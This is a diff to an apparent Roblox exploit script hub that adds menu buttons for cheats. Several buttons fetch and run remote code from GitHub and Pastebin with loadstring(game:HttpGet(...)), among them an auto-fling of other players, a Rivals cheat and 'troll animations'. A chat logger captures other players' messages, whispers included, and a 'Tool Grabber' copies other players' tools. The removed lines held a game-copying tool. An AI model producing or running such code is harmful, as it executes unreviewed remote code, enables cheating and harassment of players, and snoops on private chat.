@@ -215,6 +215,426 @@ local Button = MainTab:CreateButton({
    end,
 })
 
+local Button = MainTab:CreateButton({
+   Name = "Fling User",
+   Callback = function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Auto%20Fling%20Player"))()
+   end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Chat Logger",
+   Callback = function()
+		local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+
+
+local ChatLogger = Instance.new("ScreenGui")
+ChatLogger.Name = "ChatLogger"
+ChatLogger.Parent = CoreGui
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 300, 0, 400)
+MainFrame.Position = UDim2.new(0.8, 0, 0.5, 0)
+MainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+MainFrame.BorderSizePixel = 0
+MainFrame.Parent = ChatLogger
+
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 8)
+UICorner.Parent = MainFrame
+
+
+local DropShadow = Instance.new("ImageLabel")
+DropShadow.Name = "DropShadow"
+DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+DropShadow.BackgroundTransparency = 1
+DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
+DropShadow.Size = UDim2.new(1, 30, 1, 30)
+DropShadow.ZIndex = -1
+DropShadow.Image = "rbxassetid://6014261993"
+DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
+DropShadow.ImageTransparency = 0.5
+DropShadow.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Name = "Title"
+Title.Size = UDim2.new(1, -30, 0, 30)
+Title.Position = UDim2.new(0, 10, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "Chat Logger"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 18
+Title.Font = Enum.Font.GothamBold
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = MainFrame
+
+
+local ButtonsContainer = Instance.new("Frame")
+ButtonsContainer.Name = "ButtonsContainer"
+ButtonsContainer.Size = UDim2.new(0, 60, 0, 30)
+ButtonsContainer.Position = UDim2.new(1, -65, 0, 0)
+ButtonsContainer.BackgroundTransparency = 1
+ButtonsContainer.Parent = MainFrame
+
+local CloseButton = Instance.new("TextButton")
+CloseButton.Name = "CloseButton"
+CloseButton.Size = UDim2.new(0, 30, 0, 30)
+CloseButton.Position = UDim2.new(1, -30, 0, 0)
+CloseButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+CloseButton.Text = "×"
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.TextSize = 20
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.Parent = ButtonsContainer
+
+local MinimizeButton = Instance.new("TextButton")
+MinimizeButton.Name = "MinimizeButton"
+MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
+MinimizeButton.Position = UDim2.new(0, 0, 0, 0)
+MinimizeButton.BackgroundColor3 = Color3.fromRGB(70, 70, 80)
+MinimizeButton.Text = "−"
+MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeButton.TextSize = 20
+MinimizeButton.Font = Enum.Font.GothamBold
+MinimizeButton.Parent = ButtonsContainer
+
+
+local function addButtonStyles(button)
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = button
+    
+    local padding = Instance.new("UIPadding")
+    padding.PaddingTop = UDim.new(0, 2)
+    padding.Parent = button
+end
+
+addButtonStyles(CloseButton)
+addButtonStyles(MinimizeButton)
+
+local ScrollFrame = Instance.new("ScrollingFrame")
+ScrollFrame.Name = "ScrollFrame"
+ScrollFrame.Size = UDim2.new(1, -20, 1, -45)
+ScrollFrame.Position = UDim2.new(0, 10, 0, 35)
+ScrollFrame.BackgroundTransparency = 1
+ScrollFrame.ScrollBarThickness = 4
+ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 120)
+ScrollFrame.Parent = MainFrame
+
+local ListLayout = Instance.new("UIListLayout")
+ListLayout.Parent = ScrollFrame
+ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+ListLayout.Padding = UDim.new(0, 4)
+
+
+local messageCache = {}
+local function addMessage(player, message, messageType)
+    local timeStamp = os.date("%H:%M:%S")
+    local messageKey = player.Name .. message .. timeStamp
+    
+
+    if messageCache[messageKey] then return end
+    messageCache[messageKey] = true
+    
+
+    task.delay(1, function()
+        messageCache[messageKey] = nil
+    end)
+    
+    local messageLabel = Instance.new("TextLabel")
+    messageLabel.Size = UDim2.new(1, 0, 0, 20)
+    messageLabel.BackgroundTransparency = 1
+    messageLabel.TextSize = 14
+    messageLabel.Font = Enum.Font.Gotham
+    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
+    messageLabel.TextWrapped = true
+    
+    if messageType == "private" then
+        messageLabel.Text = string.format("[%s] [Private] %s: %s", timeStamp, player.Name, message)
+        messageLabel.TextColor3 = Color3.fromRGB(255, 180, 180)
+    else
+        messageLabel.Text = string.format("[%s] %s: %s", timeStamp, player.Name, message)
+        messageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    end
+    
+    messageLabel.Parent = ScrollFrame
+    
+    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, ListLayout.AbsoluteContentSize.Y)
+    ScrollFrame.CanvasPosition = Vector2.new(0, ListLayout.AbsoluteContentSize.Y)
+end
+
+
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+MainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+    end
+end)
+
+MainFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
+
+MainFrame.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = false
+    end
+end)
+
+
+CloseButton.MouseButton1Click:Connect(function()
+    ChatLogger:Destroy()
+end)
+
+
+local minimized = false
+MinimizeButton.MouseButton1Click:Connect(function()
+    minimized = not minimized
+    local targetSize
+    if minimized then
+        targetSize = UDim2.new(0, 300, 0, 30)
+        MinimizeButton.Text = "+"
+    else
+        targetSize = UDim2.new(0, 300, 0, 400)
+        MinimizeButton.Text = "-"
+    end
+    
+    local tween = TweenService:Create(MainFrame, TweenInfo.new(0.3), {Size = targetSize})
+    tween:Play()
+end)
+
+
+Players.PlayerChatted:Connect(function(chatType, player, message, targetPlayer)
+    if chatType == Enum.PlayerChatType.Whisper then
+        addMessage(player, message, "private")
+    else
+        addMessage(player, message, "normal")
+    end
+end)
+
+
+for _, player in ipairs(Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        addMessage(player, message, "normal")
+    end)
+end
+
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        addMessage(player, message, "normal")
+    end)
+end)
+   end,
+})
+
+local Button = MainTab:CreateButton({
+   Name = "Give Tool",
+   Callback = function()
+		        local ScreenGui = Instance.new("ScreenGui")
+        local Frame = Instance.new("Frame")
+        local ScrollingFrame = Instance.new("ScrollingFrame")
+        local UIListLayout = Instance.new("UIListLayout")
+        local TextButton = Instance.new("TextButton")
+        local TextLabel = Instance.new("TextLabel")
+        local UpdateButton = Instance.new("TextButton")
+        local CloseButton = Instance.new("TextButton")
+
+        -- Main GUI Setup
+        ScreenGui.Parent = game:GetService("CoreGui")
+        ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        ScreenGui.ResetOnSpawn = false
+
+        -- Main Frame
+        Frame.Parent = ScreenGui
+        Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+        Frame.Position = UDim2.new(0.061, 0, 0.094, 0)
+        Frame.Size = UDim2.new(0, 300, 0, 400)
+        Frame.ClipsDescendants = true
+
+        -- Add smooth corners
+        local UICorner = Instance.new("UICorner")
+        UICorner.CornerRadius = UDim.new(0, 10)
+        UICorner.Parent = Frame
+
+        -- Title Label with gradient
+        TextLabel.Parent = Frame
+        TextLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+        TextLabel.Size = UDim2.new(1, 0, 0, 40)
+        TextLabel.Font = Enum.Font.GothamBold
+        TextLabel.Text = "🎮 Tool Grabber"
+        TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        TextLabel.TextSize = 22
+
+        local UICornerTitle = Instance.new("UICorner")
+        UICornerTitle.CornerRadius = UDim.new(0, 8)
+        UICornerTitle.Parent = TextLabel
+
+        -- Scrolling Frame with modern styling
+        ScrollingFrame.Parent = Frame
+        ScrollingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        ScrollingFrame.Position = UDim2.new(0.05, 0, 0.15, 0)
+        ScrollingFrame.Size = UDim2.new(0.9, 0, 0.7, 0)
+        ScrollingFrame.CanvasSize = UDim2.new(0, 0, 10, 0)
+        ScrollingFrame.ScrollBarThickness = 6
+        ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
+
+        local UICornerScroll = Instance.new("UICorner")
+        UICornerScroll.CornerRadius = UDim.new(0, 8)
+        UICornerScroll.Parent = ScrollingFrame
+
+        UIListLayout.Parent = ScrollingFrame
+        UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+        UIListLayout.Padding = UDim.new(0, 5)
+
+        -- Tool Button Template
+        TextButton.Parent = ScrollingFrame
+        TextButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+        TextButton.Size = UDim2.new(0.95, 0, 0, 40)
+        TextButton.Position = UDim2.new(0.025, 0, 0, 0)
+        TextButton.Visible = false
+        TextButton.Font = Enum.Font.GothamSemibold
+        TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        TextButton.TextSize = 16
+        TextButton.AutoButtonColor = false
+
+        local UICornerButton = Instance.new("UICorner")
+        UICornerButton.CornerRadius = UDim.new(0, 6)
+        UICornerButton.Parent = TextButton
+
+        -- Update Button with hover effect
+        UpdateButton.Parent = Frame
+        UpdateButton.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
+        UpdateButton.Position = UDim2.new(0.1, 0, 0.88, 0)
+        UpdateButton.Size = UDim2.new(0.8, 0, 0, 35)
+        UpdateButton.Font = Enum.Font.GothamBold
+        UpdateButton.Text = "🔄 Refresh Tools"
+        UpdateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        UpdateButton.TextSize = 16
+        UpdateButton.AutoButtonColor = false
+
+        local UICornerUpdate = Instance.new("UICorner")
+        UICornerUpdate.CornerRadius = UDim.new(0, 6)
+        UICornerUpdate.Parent = UpdateButton
+
+        -- Close Button
+        CloseButton.Parent = Frame
+        CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+        CloseButton.Position = UDim2.new(0.9, 0, 0.02, 0)
+        CloseButton.Size = UDim2.new(0, 25, 0, 25)
+        CloseButton.Font = Enum.Font.GothamBold
+        CloseButton.Text = "×"
+        CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        CloseButton.TextSize = 20
+        CloseButton.AutoButtonColor = false
+
+        local UICornerClose = Instance.new("UICorner")
+        UICornerClose.CornerRadius = UDim.new(0, 6)
+        UICornerClose.Parent = CloseButton
+
+        -- Button Hover Effects
+        local function createHoverEffect(button, defaultColor, hoverColor)
+            button.MouseEnter:Connect(function()
+                game:GetService("TweenService"):Create(button, TweenInfo.new(0.3), {
+                    BackgroundColor3 = hoverColor
+                }):Play()
+            end)
+            
+            button.MouseLeave:Connect(function()
+                game:GetService("TweenService"):Create(button, TweenInfo.new(0.3), {
+                    BackgroundColor3 = defaultColor
+                }):Play()
+            end)
+        end
+
+        createHoverEffect(UpdateButton, Color3.fromRGB(0, 122, 255), Color3.fromRGB(0, 100, 200))
+        createHoverEffect(CloseButton, Color3.fromRGB(200, 50, 50), Color3.fromRGB(170, 40, 40))
+
+        -- Main Functionality
+        local function FNDR_fake_script()
+            local script = Instance.new('LocalScript', Frame)
+            local button = TextButton:Clone()
+            button.Parent = nil
+            button.Name = "ToolButton"
+
+            local function updateList()
+                for _, v in ipairs(ScrollingFrame:GetChildren()) do
+                    if v:IsA("TextButton") then v:Destroy() end
+                end
+
+                for _, v in pairs(game:GetDescendants()) do
+                    if v:IsA("Tool") and not v:IsDescendantOf(game.Players.LocalPlayer) then
+                        local cloneButton = button:Clone()
+                        cloneButton.Parent = ScrollingFrame
+                        cloneButton.Visible = true
+                        cloneButton.Text = "🔧 " .. v.Name
+                        createHoverEffect(cloneButton, Color3.fromRGB(45, 45, 45), Color3.fromRGB(60, 60, 60))
+                        
+                        cloneButton.MouseButton1Click:Connect(function()
+                            local clone = v:Clone()
+                            clone.Parent = game:GetService("Players").LocalPlayer:WaitForChild("Backpack")
+                        end)
+                    end
+                end
+            end
+
+            UpdateButton.MouseButton1Click:Connect(updateList)
+            CloseButton.MouseButton1Click:Connect(function()
+                ScreenGui:Destroy()
+            end)
+        end
+        coroutine.wrap(FNDR_fake_script)()
+
+        -- Drag Functionality
+        local function enableDragging()
+            local UserInputService = game:GetService("UserInputService")
+            local dragging, dragInput, dragStart, startPos
+            
+            Frame.InputBegan:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                    dragging = true
+                    dragStart = input.Position
+                    startPos = Frame.Position
+                end
+            end)
+            
+            Frame.InputEnded:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton1 then
+                    dragging = false
+                end
+            end)
+            
+            UserInputService.InputChanged:Connect(function(input)
+                if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+                    local delta = input.Position - dragStart
+                    Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+                        startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+                end
+            end)
+        end
+        coroutine.wrap(enableDragging)()
+   end,
+})
+
 local PillarTab = Window:CreateTab("⛩ Pillar Chase", nil)
 local Section = PillarTab:CreateSection("Pillar")
 
@@ -224,17 +644,6 @@ local Button = PillarTab:CreateButton({
    		 loadstring(game:HttpGet('https://raw.githubusercontent.com/dqvh/dqvh/main/pillar%20chase%202.lua'))() 
    end,
 })
-
-local GameTab = Window:CreateTab("🌏Copy Games", nil)
-local Section = GameTab:CreateSection("Game")
-
-local Button = GameTab:CreateButton({
-   Name = "Copy Game",
-   Callback = function()
-		local Params = {
-    RepoURL = "https://raw.githubusercontent.com/luau/SynSaveInstance/main/",
-    SSI = "saveinstance",
-}
 
 local synsaveinstance = loadstring(game:HttpGet(Params.RepoURL .. Params.SSI .. ".luau", true), Params.SSI)()
 
@@ -345,5 +754,15 @@ local Button = RivalsTab:CreateButton({
    Name = "Rivals Cheat Script",
    Callback = function()
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/EzWinsV4/FlameForRobloxRivals/refs/heads/main/Main.lua", true))()
+   end,
+})
+
+local TrollTab = Window:CreateTab("🧞‍♂️ Trolling", nil)
+local Section = TrollTab:CreateSection("Animations")
+
+local Button = AnimationsTab:CreateButton({
+   Name = "Troll Animations V1",
+   Callback = function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/093VxNLa"))()
    end,
 })
